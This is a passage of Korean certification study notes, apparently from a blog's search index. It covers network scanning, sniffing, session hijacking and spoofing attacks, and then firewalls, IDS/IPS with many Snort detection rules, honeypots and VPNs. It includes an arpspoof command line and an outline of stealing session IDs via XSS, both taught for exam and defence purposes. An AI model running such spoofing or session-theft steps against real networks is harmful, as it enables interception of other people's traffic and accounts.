: FIN, PSH, URG -&gt; 응답 X           Port Close : FIN, PSH, URG -&gt; RST                           NULL Scan            공격자는 TCP NULL 패킷을 전송하여 포트 오픈을 확인                    Port Open : NULL -&gt; 응답 X           Port Close : NULL -&gt; RST                           ACK Scan            공격자는 TCP ACK 패킷을 전송하여 방화벽 필터링 여부를 알 수 있음 (unfiltered)                    Port Open : ACK -&gt; RST           Port Close : ACK -&gt; RST                           TCP Fragmentation            20Byte의 헤더를 2개로 분할하여 보안장비의 탐지를 우회하는 방법       첫 번째 패킷은 IP 주소 정보가 있고 두 번째 패킷은 Port 정보만 있음           스니핑 공격   1. 스니핑(Sniffing)     개요            네트워크로 전송되는 패킷을 훔쳐보는 도구       송신자와 수신자의 IP주소, 포트번호 및 송수신 메시지 확인       Normal Mode : 자신의 컴퓨터에 전송되는 패킷만 수신받고 나머지 패킷은 Drop 한다.       Promiscuous Mode : 네트워크에 흐르는 모든 패킷을 모니터링 한다.                    #&gt; ifconfig eth0 promisc                       tcpdump, wireshark       소극적 공격은 적발이 어렵지만 예방이 가능하다. (예: 암호화)           2. 세션 하이재킹(Session Hijacking)     개요            로그인 사용자에게 웹 서버가 세션 값이라는 문자열을 생성해서 전송할 때 세션 값이라는 문자열만 획득하면 로그인 과정없이 홈페이지에 접근할 수 있음       이미 인증을 받아 세션을 생성, 유지하고 있는 연결을 빼앗는 공격       인증을 위한 모든 검증을 우회       TCP를 이용해 통신하고 있을 때 RST 패킷을 보내 일시적으로 TCP 세션을 끊고 시퀀스 넘버를 새로 생성하여 세션을 빼앗고 인증을 회피       세션을 스니핑 추측(Brute-Force Guessing)을 통해 도용하거나 가로채어 자신이 원하는 데이터를 보낼 수 있는 공격방법       원인 : 암호화되지 않은 프로토콜에서 정보를 평문으로 전송, 길이가 짧은 Session ID, 세션 타임아웃 부재       세션 하이재킹은 어떻게 세션 값을 훔칠 것인지를 의미하는 것이다                    공격자 웹 서버에 세션 문자열을 기록하는 악성코드를 하나 생성           XSS를 사용해서 피해자가 악성코드를 호출하게 유도           공격자는 웹프록시를 사용하여 세션값을 피해자의 세션 값으로 변경후 사이트 접속                                세션 하이재킹 도구                                                  도구               내용                                                               Hunt               네트워크상의 감시, 가로채기                                         Arpspoof               공격자의 주소로 속이는 행위                                         IP Watcher               네트워크상의 연결, 감시 및 세션을 가로채기 위한 다양한 기능                                         Ferret               세션 정보를 가로채는 도구                                         Hamster               Proxy 서버 상태로 만들어 주는 도구                                         Paros               웹 Proxy 서버로서 쓸 수 있는 도구                                         Cain &amp; Abel               스푸핑과 스캐닝 등 다양한 기능                                         WireShark               네트워크 패킷 분석, 다양한 패킷 정보를 볼 수 있음                                                   스푸핑 공격   1. IP Spoofing   1. 개요     자신의 IP를 속이는 행위   TCP/IP의 취약점을 이용            순서 제어 번호 추측 (Sequence Number Guessing)       SYN flooding       Connect Hijacking       RST/FIN 을 이용한 접속끊기       SYN/RST 패킷 생성 공격       IP주소 인증(rlogin, rsh등)           2. 대응 방법                  대응 방법       내용                       Router에서 Source Routing 차단       ⦁ 외부에서 유입되는 패킷 중 출발지 IP(Source)에 내부망 IP 주소를 가지고 있는 패킷을 라우터 등에서 차단함 ⦁ 내부에서 발생한 IP Spoofing은 차단하지 못함                 Sequence Number를 Random하게 발생시키도록 함       ⦁ 일부 운영체제 중에서 Sequence Number를 일정하게 증가시키면서 사용함 ⦁ Random하게 발생하도록 서버 설정을 변경                 R-Command 취약점 제거       IP로 인증하는 서비스들을 가능하면 차단함                 암호화된 프로토콜       IP Spoofing 공격을 효과적으로 차단하지만 속도가 느려짐           3. DNS Spoofing 및 Web Spoofing                  기법       내용                       DNS Spoofing       ⦁ DNS(Domain Name System) : www.abc.com 등의 도메인 이름을 IP 주소로 바꾸는 역할 ⦁ www.abc.com의 IP 주소를 바꾸어 엉뚱한 사이트로 접속하게 하는 공격 (예:위장된 금융사이트 접속)                 Web Spoofing       ⦁ 공격자가 다른 컴퓨터(공격대상)로 전송되는 웹 페이지를 보거나 바꿀 수 있는 방법 ⦁ 가짜 홈페이지를 만들어 두고 로그인을 유도하여 정보 획득(ID/PW, 신용카드 정보 등)           2. ARP Spoofing     개요            로컬 통신 과정에서 서버와 클라이언트는 IP와 MAC 주소로 통신       클라이언트의 MAC 주소를 중간에 공격자가 자신의 MAC 주소로 변조하여 마치 서버와 클라이언트가 통신하는 것처럼 속이는 공격       이러한 공격은 fragrouter를 통하여 연결이 끊어지지 않도록 Release를 해줘야 함           특징            ARP는 인증을 하지 않기 때문에 ARP Reply 패킷을 각 호스트에 보내서 쉽게 ARP Cache를 업데이트한다.       즉, 변조된 ARP Reply 를 지속적으로 보내서 각 호스트들이 ARP Cache에 변조된 MAC 주소정보를 계속 유지시켜야 한다.           방법            arp : 현재 IP 주소와 MAC 주소를 확인 (linux)       arp -a : 현재 IP 주소와 MAC 주소를 확인 (windows)       arpspoof -i eth0 -t [victim ip] [gateway ip]           정적 설정법            arp -s [IP 주소] [MAC 주소]           3. 원격접속 공격     개요            RDP, Teamviewer, VNC, NetCat 등의 프로그램 사용       원격으로 윈도우 시스템에 연결하여 윈도우 시스템을 모니터링하거나 명령을 실행하는 공격                윈도우 원격접속 프로그램                                  구분           내용                                           RDP           Remote Desktop Protocol, RDP는 MS에서 개발한 원격 데스크톱 연결 프로그램이 사용하는 프로토콜                             Teamviewer           원격으로 시스템에 연결하는 프로그램                             VNC           Virtual Networking Computing, 원격으로 대상 시스템을 모니터링하거나 관리할 수 있는 프로그램                             NetCat(NC)           원격으로 연결하여 명령을 실행할 수 있는 프로그램                           대응 방법            윈도우 원격 데스크톱 프로토콜(RDP)                    RDP 서비스에 취약한 패스워드 사용 -&gt; 무작위 공격(Brute Force Attack)대상           RDP 에서 사용하는 기본포트 (3389/TCP)           RDP 포트 변경 : HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp 의 PortNumber 키 값 변경           시스템 속성 -&gt; 원격 -&gt; 이 컴퓨터에 대한 원격 지원 연결 허용 해제                       VNC                    패스워드 복잡도를 준수하여 3~6개월 단위로 패스워드 변경           VNC가 사용하는 포트번호(5800/tcp, 5900/tcp)를 다른 포트번호로 변경                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","네트워크 보안","네트워크 공격기법"],
        "url": "https://bluesplatter.com/is_certification/ISCert-02Network-02Attack/",
        "teaser": null
      },{
        "title": "02.네트워크 보안 - 03.네트워크 대응 기술 및 응용",
        "excerpt":"침입차단 시스템   1. 침입차단 시스템(Firewall)     개요            접근통제 (Access Control List) 를 적용하여 시스템에 접근이 허용 가능한 사용자, IP, 포트를 결정       인바운드 : 외부 네트워크에서 내부 네트워크로 들어오는 것       아웃바운드 : 내부에서 외부로 나가는 것                    리버스 텔넷(Reverse Telnet) : 내부 망에서 공격자의 PC로 연결                           2. 침입차단 시스템 구현방식에 따른 유형   1. 패킷 필터링(Packet Filtering)                  구분       내용                       계층       Network 계층과 Transport 계층에서 작동                 특징       미리 정해진 규칙에 따라 패킷 출발지 및 목적지 IP 주소 정보와 각 서비스의 port 번호를 이용해 접속 제어                 장점       ⦁ 다른 방화벽에 비해 속도가 빠름 ⦁ 사용자에게 투명성을 제공하며, 새로운 서비스에 대해 쉽게 연동이 가능                 단점       ⦁ TCP/IP 구조적인 문제로 인한 패킷의 헤더는 쉽게 조작이 가능 ⦁ 강력한 Logging 및 사용자 인증 기능을 제공하지 않음           2. 애플리케이션 게이트웨이(Application Gateway)                  구분       내용                       계층       Application 계층                 특징       ⦁ 각 프로토콜 별로 Proxy Daemon이 있어 Proxy Gateway 라고도 함 ⦁ 사용자 및 응용 서비스에서 접근 제어를 제공하여 응용 프로그램 사용을 기록하여 감시 추적에 사용                 장점       ⦁ Proxy 를 통해서만 연결이 허용되므로 내부 IP 주소를 숨길 수 있음 ⦁ Packet 필터링에 비해 보안성 우수 ⦁ 가장 강력한 Logging과 Audit 기능 제공                 단점       성능이 떨어지고, 새로운 서비스에 대해 유연성이 결여           3. 회선 게이트웨이(Circuit Gateway)                  구분       내용                       계층       Application ~ Session 계층 사이                 특징       방화벽을 통해 내부 시스템으로 접속하기 위해서는 Client 측에 Circuit Proxy를 인식할 수 있는 수정된 Client 프로그램(예 : SOCKS) 이 필요하며 설치된 Client만 Circuit 형성이 가능                 장점       ⦁ 내부의 IP 주소를 숨길 수 있고 투명한 서비스 제공 ⦁ Application에 비해 관리가 수월                 단점       ⦁ 수정된 Client 프로그램 필요 ⦁ 비표준 포트로 우회 접근 시 방어 불가           4. 상태 기반 패킷 검사(Stateful Packet Inspection)                  구분       내용                       계층       전 계층에서 동작                 특징       ⦁ 패킷 필터링 방식에 세션 추적 기능 추가 ⦁ 패킷의 헤더 내용 해석하여 순위에 위배되는 패킷 차단 ⦁ 패킷 필터링의 기술을 사용하여 Client/Server 모델을 유지하면서 모든 계층의 전후 상황에 대한 문맥 데이터를 제공하여 기존 방화벽의 한계 극복 ⦁ 방화벽 표준으로 자리매김                 장점       서비스에 대한 특성 및 통신 상태를 관리할 수 있기 때문에 돌아나가는 패킷에 대해서는 동적으로 접근 규칙을 자동 생성                 단점       데이터 내부에 악의적인 정보를 포함할 수 있는 프로토콜에 대한 대응이 어려움           5. 혼합형 타입(Hybrid type)                  구분       내용                       특징       서비스의 종류에따라 복합적으로 구성할 수 있는 방화벽                 장점       서비스의 종류에 따라서 사용자의 편의성, 보안성 등을 고려하여 방화벽 기능을 선택적으로 부여                 단점       구축 및 관리의 어려움           6. 심층 패킷분석(Deep Packet Inspection)      패킷이 가지고 있는 컨텐츠까지 모두 검사   OSI 전 게층에서 동작, 전 계층에 대한 접근 통제   3. 침입차단 시스템 구축 유형   1. 스크리닝 라우터(Screening Router)      이미지 출처                  구분       내용                       내용       IP, TCP, UDP 헤더 부분에 포함된 내용만 분석하여 동작하며 내부 네트워크와 외부 네트워크 사이의 패킷 트래픽을 perm/drop 하는 라우터                 장점       ⦁ 필터링 속도가 빠르고 비용 적음 ⦁ 클라이언트와 서버 환경 변화 없이 설치가 가능 ⦁ 전체 네트워크에 동일한 보호 유지                 단점       ⦁ OSI 3,4 계층만 방어하여 필터링 규칙을 검증하기 어려움 ⦁ 패킷 내의 데이터는 차단 불가 및 로그 관리가 어려움           2. 베스천 호스트(Bastion Host)      이미지 출처                  구분       내용                       내용       ⦁ 내부 네트워크 전면에서 내부 네트워크 전체를 보호하며 외부 인터넷과 내부 네트워크를 연결하는 라우터 뒤에 위치 ⦁ Lock down 된 상태에 있으며 인터넷에서 접근이 가능한 서버                 장점       ⦁ 스크리닝 라우터보다 안전 ⦁ Logging 정보 생성 관리가 편리 ⦁ 접근 제어와 인증 및 로그 기능 제공                 단점       ⦁ Bastion Host 손상 시 내부망 손상 ⦁ 로그인 정보 유출 시 내부망 침해 가능           3. 듀얼 홈드 호스트(Dual-Homed Host)      이미지 출처                  구분       내용                       내용       ⦁ 2개의 네트워크 인터페이스를 가진 Bastion Host로서 하나의 NIC(Network Interface Card)는 내부 네트워크와 연결하고 다른 NIC는 외부 네트워크와 연결 ⦁ 방화벽은 하나의 네트워크에서 다른 네트워크로 IP 패킷을 라우팅하지 않기 때문에 Proxy 기능을 부여                 장점       ⦁ 정보 지향적인 공격 방어 ⦁ Logging 정보 생성 관리가 편리 ⦁ 설치 및 유지보수가 쉬움                 단점       ⦁ 방화벽에서 보안 위반 초래 가능 ⦁ 서비스가 증가할수록 Proxy 구성 복잡           4. 스크린드 호스트(Screened Host)      이미지 출처                  구분       내용                       내용       ⦁ Packet Filtering Router와 Bastion Host로 구성되어 있음 ⦁ Packet Filtering Router는 외부 및 내부 네트워크에서 발생하는 패킷을 통과시킬 것인지를 검사하고 외부에서 내부로 유입되는 패킷에 대해서는 Bastion Host로 검사된 패킷을 전달 ⦁ Bastion Host는 내부 및 외부 네트워크 시스템에 대한 인증을 담당                 장점       ⦁ 네트워크 계층과 응용 계층의 2단계 방어이므로 매우 안전 ⦁ 가장 많이 사용, 융통성 우수 ⦁ Dual-Homed 장점 유지                 단점       ⦁ 스크리닝 라우터의 정보가 변경되면 방어가 불가능 ⦁ 구축 비용이 높음           5. 스크린드 서브넷(Screened Subnet)      이미지 출처                  구분       내용                       내용       ⦁ 스크린드 호스트 보안상의 문제점을 보완 ⦁ 외부 네트워크와 내부 네트워크 사이에 하나 이상의 경계 네트워크를 두어 내부 네트워크를 외부 네트워크로 분리하기 위한 구조 ⦁ 일반적으로 두 개의 스크리닝 라우터와 한 개의 베스천 호스트를 이용하여 구축                 장점       ⦁ 스크린드 호스트 구조의 장점 유지 ⦁ 가장 안전한 구조                 단점       ⦁ 설치 및 관리가 어려움 ⦁ 구축 비용이 높고, 서비스 속도가 느림           침입탐지 시스템   1. 침입탐지 시스템(Intrusion Detection System)   1. 개요     침입 패턴 정보를 데이터베이스에 저장하고 지능형 엔진을 사용하여 네트워크나 시스템의 침입을 실시간 모니터링, 침입탐지 여부를 확인하는 보안시스템   조직 IT 시스템의 기밀성, 무결성, 가용성을 침해하고, 보안정책을 위반하는 침입사건을 사전 또는 사후에 감시, 탐지, 대응하는 보안 시스템   컴퓨터 시스템의 비정상적인 사용, 오용, 남용 등을 가능하면 실시간으로 탐지하는 시스템   2. 침입차단 시스템 차단 방법                  절차       세부 설명                       정보 수집       ⦁ 침입탐지를 하기 위한 근원적인 자료들을 수집 ⦁ 자료원에 따라 NIDS와 HIDS 로 나누어짐                 정보 가공 및 축약       ⦁ 불필요한 정보 제거(침입과 관련 없는 정보 제거) ⦁ 침입 판정을 위한 최소한의 정보만 남김(분석의 복잡도를 감소)                 침입 분석 및 탐지       ⦁ 축약된 정보를 기반으로 침입 여부를 분석, 탐지 ⦁ 방식에 따라 오용탐지와 이상탐지로 나누어짐                 보고 및 조치       ⦁ 침입탐지 후 적절한 보고 및 대응 조치 ⦁ 다른 보안장비(방화벽) 등과 연계           3. 침입탐지 방법                  구분       오용탐지(Misuse)       비정상탐지/이상탐지(Anomaly)                       동작 방식       시그니처(Signature) 기반, 지식(Knowledge) 기반       프로파일(Profile) 기반, 행동(Behavior) 기반, 통계(Statistical) 기반                 침입판단 방법       ⦁ 미리 정의된 Rule에 매칭 ⦁ 이미 정립된 공격패턴을 미리 입력하고 매칭       ⦁ 미리 학습된 사용자 패턴에 어긋남 ⦁ 정상적, 평균적 상태를 기준, 급격한 변화 있을 때 침입 판단                 사용기술       패턴 비교, 전문가시스템       신경망, 통계적 방법, 특징 추출                 장점       ⦁ 빠른 속도, 구현이 쉬움, 이해가 쉬움 ⦁ False Positive가 낮음       ⦁ 알려지지 않은 공격(Zero Day Attack) 대응 가능 ⦁ 사용자가 미리 공격 패턴을 정의할 필요가 없음                 단점       ⦁ False Negative가 큼 ⦁ 알려지지 않은 공격탐지 불가 ⦁ 대량의 자료 분석에 부적합       ⦁ 정상인지, 비정상인지 결정하는 임계치 설정이 어려움 ⦁ False Positive가 큼 ⦁ 구현이 어려움              False Positive : false(+)로 표현, 공격이 아닌데도 공격이라고 오판하는 것   False negative : false(-)로 표현, 공격이지만 공격이 아니라고 오판하는 것   4. 침입탐지 시스템 분류                  구분       NIDS(Network based IDS)       HIDS(Host based IDS)                       동작       ⦁ 네트워크에 흐르는 패킷들을 검사, 침입 판단 ⦁ 방화벽 외부의 DMZ나 방화벽 내부의 내부 네트워크 모두 배치 가능       ⦁ 시스템 상에 설치, 사용자가 시스템에서 행하는 행위, 파일의 체크를 통해 침입 판단 ⦁ 주로 웹 서버, DB 서버 등의 중요 서버에 배치                 자료원       Promiscuous 모드로 동작하는 네트워크 카드나 스위치       시스템 로그, 시스템 콜, 이벤트 로그                 탐지 가능 공격       스캐닝, 서비스 거부 공격(DoS), 해킹       내부자에 의한 공격, 바이러스, 웜, 트로이목마, 백도어                 장점       ⦁ 네트워크 자원의 손실 및 패킷의 변조가 없음(캡처만 하기 때문) ⦁ 거의 실시간으로 탐지가 가능함 ⦁ 감시 영역이 하나의 네트워크 서브넷으로서 HIDS에 비해 큼       ⦁ 침입의 성공 여부 식별이 가능함 ⦁ 실제 해킹 및 해킹시도 판단이 용이 ⦁ 주로 S/W적으로 서버와 같은 시스템에 인스톨되며, 설치 및 관리가 간단함                 동작       ⦁ 부가 장비가 필요함(스위치 등) ⦁ 암호화된 패킷은 분석 불가 ⦁ False Positive가 높음 ⦁ 오탐으로 인해 정상적인 세션이 종료 ⦁ DoS의 경우 대응이 불가능(탐지만 가능) ⦁ 능동적인 대응 기능 미비       ⦁ 감시 영역이 하나의 시스템으로 한정됨 ⦁ 탐지 가능한 공격에 한계가 있음(주로 이벤트 로그로만 탐지) ⦁ 오탐으로 인해 정상적인 사용자가 자신의 계정을 사용할 수 없는 문제                   Hybrid IDS : NIDS + HIDS, 단일 호스트를 출입하는 네트워크 패킷을 검색 시스템의 이벤트, 데이터, 디렉터리, 레지스트리에서 공격 여부를 감시하여 보호한다.            IDS의 지식기반 탐지 기법과 행위기반 탐지기법                                  지식기반 탐지 기법           행위기반 탐지 기법                                           ⦁ 전문가 시스템 ⦁ 시그니처 분석 ⦁ 페트리넷 ⦁ 상태전이 ⦁ 신경망 ⦁ 유전 알고리즘           ⦁ 통계적 방법 ⦁ 전문가 시스템 ⦁ 신경망 ⦁ 컴퓨터 면역학 ⦁ 데이터 마이닝 ⦁ 기계학습                           2. Snort   1. 개요     패킷을 스니핑해서 지정한 Rule과 동일한 패킷을 탐지하는 침입탐지 시스템   침입탐지 시스템을 구현한 공개 소프트웨어, Plug-in 형태로 기능을 추가함   2. Snort Rule     개요            공격자의 공격을 탐지하기 위한 등록된 규칙(패턴)       수신되는 패킷은 Rule과 비교해서 탐지여부를 결정       Rule은 Rule Header와 Rule Option으로 구성되고 Rule Header는 Action Protocol, IP 주소, 포트 등으로 구성되고, Rule Option은 탐지할 조건으로 구성된다.       Rule 과 비교해서 탐지가 완료되면 경고 및 로그를 발생       패킷(Packet) -&gt; 스니퍼(Sniffer) -&gt; 전처리기(Preprocessing) -&gt; 탐색엔진-탐지 룰(Detection Engine) -&gt; 경고,로깅(Alert, logging) -&gt; 로그 파일(Log file)           스니퍼(Sniffer)            네트워크 인터페이스에 입력되는 패킷을 수신       스니퍼는 Promiscuous Mode 로 동작하여 네트워크에 전송되는 모든 패킷 수신       TCP, UDP, IP, ICMP 의 프로토콜을 수신받음       Snort 가 실행하는 것이 아니라 WinPcap 라이브러리가 실행           전처리기(Preprocessing)            입력되는 패킷에 대해 특정 행위가 탐지될 경우 탐색엔진으로 전송       필요한 Plug-in을 활성화 / 비활성화 시킴       프로토콜의 종류별로 검사 여부를 결정할 수 있음           탐색엔진(Detection Engine)            등록된 Rule과 동일한지 규칙 기반 패턴 검색을 실행       Rule과 일치하면 로그를 기록하거나 경고(Alert)를 발생           경고(Alert) 및 로깅(Logging)            탐지된 정보에 대해 로그파일, 네트워크, SNMP 프로토콜 등으로 결과 전송       로그파일에 기록하거나 등록된 데이터베이스에 입력           3. Snort 시그니처 (Signature)                  룰 헤더(Rule Header)       룰 옵션(Rule Option)                       alert tcp any any -&gt; any any       (msg: \"ABC TCP\" ; sid:100000491;)              룰 지정 파일 : local.rules   룰 헤더 (Rule Header)                     처리 방법(action)                                                  종류               내용                                                               alert               alert 를 발생시키고 탐지 정보를 로그파일에 기록한다.                                         log               패킷에 대해서 로그를 기록한다.                                         pass               패킷을 무시한다.                                         dynamic               ⦁ activate 시그니처에 의해서 유효하게 된 경우는 한쪽의 패킷을 기록한다. ⦁ activate 시그니처가 있어야만 동작이 가능하다.                                               프로토콜 (Protocol)                    TCP, UDP, IP, ICMP의 프로토콜을 설정                       IP 주소와 포트번호                    서브넷 마스크와 함께 설정이 가능함           211.110.15.33/24                       Direction                    패킷의 방향을 위미           198.150.10.2/24 1000 -&gt; 211.110.15.33/24 80                           룰 옵션(Rule Option)            탐지 조건을 여러 개 설정할 때는 각 조건마다 ; 를 넣어 구분                간단한 탐지 조건                                                  룰 옵션               내용                                                               msg               ⦁ alert가 발생하면 msg가 설정된 문장을 로그파일에 기록한다. ⦁ 예: msg:\"Hack TCP\"                                         sid               ⦁ 시그니처 아이디를 지정하는 것으로 0~99는 예약되어 있고 100~1000000은 snort.org에서 공식적으로 배포하는 룰이다. ⦁ 1000000 이상의 값으로 사용자가 지정해서 사용한다.                                         dsize               ⦁ 버퍼 오버플로우 탐지할 때 자주 사용 ⦁ 전송되는 패킷의 사이즈를 식별할 수 있어서 dsize보다 큰 값과 작은 값에 대한 설정이 가능하다 ⦁ 예: dsize:100&lt;&gt;500 -&gt; 100에서 500바이트의 패킷을 탐지                                         nocase               패턴을 매칭할 때 대문자와 소문자를 구분하지 않는다.                                               content                    전송하는 페이로드를 검색해서 지정한 문자열이 있는지 확인 (문자열/바이너리)                        패턴 매칭 옵션                                                                  옵션                   내용                   예제                                                                                   !                   입력한 값과 일치하지 않으면 탐지                   content:!\"google\";                                                     |                   Hex 값을 표현할 때 사용                   content:\"|30|\";                                                     \\                   특수 기호를 탐지할 때 사용                   content:\"\\\"google\\|\";                                                                               flags                    TCP 프로토콜에서 Control Flags (SYN,FIN,URG,ACK)를 지정하는 것                        Control Flags                                                                  구분                   내용                                                                                   SYN                   TCP 연결 시에 동기화를 요구한다.                                                     ACK                   응답에 대한 확인을 요구한다.                                                     PSH                   데이터 버퍼링을 하지 않고 수신자에게 송신을 요구한다.                                                     URG                   긴급 포인터 Flag이다.                                                     FIN                   정상 접속 종료이다.                                                     RST                   비정상 종료를 위한 Reset을 한다.                                                                   예 : flags:SF - SYN과 FIN 모두 탐지                       flow                    established : TCP 연결이 확립된 세션 탐지           alert tcp any any -&gt; any 80 (msg:\"TCP Coneection\"; flow:established; sid:100000491;)                       itype 과 icode                    ICMP 프로토콜 : 네트워크의 오류를 감시하고 보고하는 프로토콜, 헤더에 Type 값이 0 이면 ICMP Echo Reply 이고 8이면 ICMP Echo Request           예 : alert icmp any any -&gt; any any (itype:0; msg:\"ICMP echo Reply\"; sid:10000491;)                       sameip                    송신자와 수신자의 IP 주소가 동일한 것을 탐지           Land Attack 탐지                            alert ip any any -&gt; 210.10.111.23/24 any (msg:\"Land Attack\"; sameip;)                                               session                    TCP를 사용하는 POP3 전자우편 프로토콜의 세션 정보를 로그에 기록하는 시그니처를 가정           log tcp any any -&gt; any 110 (session: printable);                       threshold                    동일한 특정 패킷에 대해 설정한 시간 내에 일정 수가 발생하면 탐지 (무작위 공격 (Brute Force) 을 탐지)           threshold: type [limit, threshold, both], track [by_src, by_dst], count [횟수], seconds [몇 초]                        threshold 옵션                                                                  구분                   내용                                                                                   limit                   count 동안에 횟수 번째 트래픽까지 탐지한다.                                                     threshold                   횟수마다 계속 탐지한다.                                                     both                   count 동안 횟수만큼 트래픽이 탐지 될 시에 한번만 탐지한다.                                                     by_src                   출발지의 패킷만 탐지한다.                                                     by_dst                   목적지 패킷만 탐지한다.                                                                   사용 예 : ICMP 패킷이 20초 동안 5번 발생하면 한 번씩 경고 메시지를 기록           alert icmp any any -&gt; any any (msg:\"ICMP\";threshold: type both, track by_src, count 5, seconds 20; sid:10000495;)                       세션절단                    탐지 후 세션절단(1)                            alert tcp any any -&gt; any any (msg:\"Outgoing HTTP Connection\";react:block;sid:10000495;)                                   탐지 후 세션절단(2)                            alert tcp any any -&gt; any any (msg:\"Outgoing HTTP Connection\";react:warn,msg;sid:10000495;)                                                   4. Snort 탐지     TCP SYN Flag 탐지            alert tcp any any -&gt; any any (msg:\"SYN Attack\"; flags:S; threshold:type both, track by_src, count 10, seconds 20; sid:10000495;)           TCP ACK Flag 탐지            alert tcp any any -&gt; any any (msg:\"ACK Attack\"; flags:A; threshold:type both, track by_src, count 10, seconds 20; sid:100000495;)           TCP NULL Flag 탐지            alert tcp any any -&gt; any any (msg:\"NULL Attack\";flags:0; threshold:type both, track by_src, count 10, seconds 20; sid:10000495;)           Ping of Death            alert icmp any any -&gt; any any (msg:\"Ping of Death\"; fragbits:M; threshold:type both, track by_src, count 10, seconds 20;sid:10000495;)           특정 문자열 탐지            alert tcp any any -&gt; any 80 (msg:\"Content Detection\"; content:\"test\";offset:0;nocase;sid:100000495;)           Telnet에 대한 탐지(로그인 실패)            alert tcp any any -&gt; any 23 (msg:\"Telnet Connection\";content:\"login failed\";nocase;sid:100000495;)           Telnet에 대한 탐지(로그인 성공)            alert tcp any any -&gt; any 23 (msg:\"Telnet Success\"; content:\"Documents and Setting\";nocase;sid:100000495;)           SSH 탐지            alert tcp any any -&gt; any 22 (msg:\"SSH Connection\"; content:\"SSH-2.0\";nocase;sid:100000495);           SSH 무작위 공격 탐지            alert tcp any any -&gt; any 22 (msg\"Brute Force SSH\";threshold:type both, track by_src, count 10, seconds 20;content:\"SSH-2.0\";sid:100000495;)           FTP 무작위 공격 탐지            alert tcp any any -&gt; any 21 (msg:\"Brute Force FTP\";threshold:type both, track by_src, count 10, seconds 20; content:\"Login incorrect\";sid:100000495;)           Telnet 무작위 공격 탐지            alert tcp any any -&gt; any 23 (msg:\"Brute Force Telnet\";threshold:type both, track by_src, count 10, seconds 20, content:\"Login Failed\";sid:100000495;)           웹 서버에 접근하는 호스트 탐지            alert tcp any any -&gt; any 80 (msg:\"Web Server\"; content:\"GET/admin/index.html\";nocase;sid:100000495;)           침입대응 시스템   1. 침입대응 시스템 (Intrusion Prevention System)     공격 시그니처를 찾아내 네트워크에 연결된 기기에서 비정상적인 활동이 이루어지는지 감시, 자동으로 해결조치하는 보안솔루션   침입 경고 이전에 공격을 중단시키는 것이 주요 목적   Real Time 대응이 가능한 예방 통제 시스템   2. 침입대응 시스템 종류                  구분       설명                       NIPS(Network IPS)       공격 탐지에 기초하여 트래픽 통과 여부를 결정하는 인라인 장치                 HIPS(Host IPS)       호스트 OS 위에서 수행, 공격 탐지 후 실행 전에 공격 프로세스 차단 기능           허니팟   1. 개요     해커들의 정보를 얻기 위한 하나의 개별 시스템   해커의 행동, 공격 기법 등을 분석하는데 사용   합법적이고 윤리적인 유인(Enticement) != Entrapment(유혹,불법/비윤리)   Zero Day 공격을 탐지하기 위한 수단   Padded-cell : IDS와 연계하여 IDS에서 탐지 후 Honeypot으로 패킷을 전달하는 것으로 교정통제 효과가 있다.   침입사고 대응 및 분석 기술 발전을 위한 인터넷 위협 정보 수집 및 위협에 대한 자산 보호 정보를 제공   2. UTM (Unified Threat Management)     통합 보안 솔루션   Firewall, IDS, IPS, Anti-virus 등의 보안 솔루션을 하나의 하드웨어에 통합   구매비용이 적고 일관성 있는 보안정책을 적용   3. 허니팟 위치                  구분       설명                       방화벽 앞       IDS처럼 Honeypot 공격으로 인한 내부 네트워크 위험도 증가는 없음                 방화벽 내부       효율성이 높아 내부 네트워크에 대한 위험도 커짐                 DMZ 내부       가장 적당한 위치, 설치시간 소요, 관리 불편, 다른 서버와의 연결은 반드시 막아야 함           4. 허니팟 구축 시 고려사항     해커에 쉽게 노출되어 해킹 가능한 것처럼 취약해 보여야 한다.   시스템의 모든 구성요소를 갖추고 있어야 한다.   시스템을 통과하는 모든 패킷을 감시해야 한다.   시스템 접속자에 대해 관리자에게 알려야 한다.   가상사설망   1. 가상사설망 개요     Virtual Private Network   공중망(인터넷)을 이용하여 사설망(기업 전용 네트워크)과 같은 효과를 얻기 위한 컴퓨터 시스템과 프로토콜의 집합   보안성이 우수하고 사용자 인증, 주소 및 라우터 체계의 비공개와 데이터 암호화, 사용자 Access 권한을 제어한다.   패스워드 인증과 함께 USB를 사용한 2-Factor 인증 제공   터널링 : VPN 클라이언트와 VPN 서버 간에 암호화 키 교환 과정을 수행한 후에 암호화를 사용해서 메시지를 주고 받음   SSL VPN : 별도 소프트웨어 설치 필요 없음 (웹 브라우저 사용)   IPSEC VPN : 별도의 소프트웨어 설치 필요   PPTP VPN : 윈도우에서 기본적으로 지원   2. SSL VPN   1. SSL (Secured Socket Layer) VPN     웹브라우저만 있으면 언제 어디에서나 사용이 가능            웹 브라우저와 웹 서버 간에 SSL 협상과정을 한 후 세션키를 생성, 세션키로 암호화 하여 터널링을 구현           서버와 클라이언트 간 인증(Certification) : RSA 방식과 X.509 사용   실제 암호화된 정보는 새로운 암호화 소켓 채널을 통해 전송   OSI 4~7계층에서 동작   2. SSL VPN 구성     이미지 출처     브라우저와 웹 서버 사이의 통신을 위해 널리 사용되는 세션 기반 프로토콜   브라우저와 서버 간 전송되는 모든 거래를 위한 안전한 통로를 제공   대칭키 암호화(트래픽 암호)와 비대칭키 암호화(대칭키 암호)를 혼합해서 사용   Server 와 Client 사이의 인증, 기밀성, 무결성, 부인방지 서비스 제공   SSL은 상호 인증, 무결성을 위한 메시지 인증 코드(MAC), 기밀성을 위한 암호화 등을 제공함으로써 안전한 데이터 통신을 제공   3. SSL VPN 특징                  구분       설명                       장점       ⦁ 별도 장비 없이 웹브라우저만으로 VPN 구현 가능, 뛰어난 사용성과 관리의 편의성 ⦁ 네트워크 레이어의 암호화 방식이기 때문에 HTTP 뿐만 아니라 NNTP(뉴스전송 프로토콜), FTP 등에도 사용                 단점       SSL 자체의 부하(암복호화 지연)           4. SSL VPN 보안 서비스                  보안서비스       설명                       인증 (Authentication)       ⦁ Client가 접속하는 서버가 신뢰할 수 있는 서버인지 또는 서버에 접속한 Client가 허가된 사용자인지를 확인 ⦁ 전자서명과 X.509 공개키 인증서 사용                 무결성 (Integrity)       함께 키를 사용하는 MAC 기법을 사용하여 데이터 변조 여부 확인                 기밀성 (Confidentiality)       대칭키 암호 사용                 부인봉쇄 (Non-repudiation)       부가적인 SW를 사용하여 응용 계층에서 메시지에 대한 전자서명 허용              주로 클라우드 서비스와 함께 사용   공개된 네트워크 망에서 접근할 수 있기 때문에 추가적인 인증 기능인 OTP 단말기를 같이 사용   3. 